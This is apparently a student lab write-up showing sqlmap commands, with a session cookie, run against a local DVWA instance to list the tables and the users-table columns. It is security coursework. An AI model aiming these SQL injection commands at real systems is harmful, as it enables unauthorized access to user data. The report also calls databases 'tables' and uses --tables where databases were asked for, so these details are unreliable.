# Lab #1,22110059, INSE331280E_02FIE

# Task 2. Attack on the database of Vulnerable App from SQLi lab 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
## 1. Get the cookies for the authentication
![alt text](/pic1.jpg)
Type 1 and then submit then inspect
Then go to network and get cookie
![alt text](/pic2.jpg)

## 2. Type the command in terminal to get the available databases
Type sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"  --cookie="PHPSESSID=3h94atgssds8un3l2ho6j2bqr5; security=low" --tables into the terminal
![alt text](/command1.jpg)
Then we have 2 available tables
First one is dvwa and the second one is information_schema
![alt text](/table1.jpg)
![alt text](/table2.jpg)

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
We type the command sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"  --cookie="PHPSESSID=3h94atgssds8un3l2ho6j2bqr5; security=low" -D dvwa -T users --columns to get tables 
![alt text](/command2.jpg)
And the tables,users information will appear
![alt text](/table3.jpg)




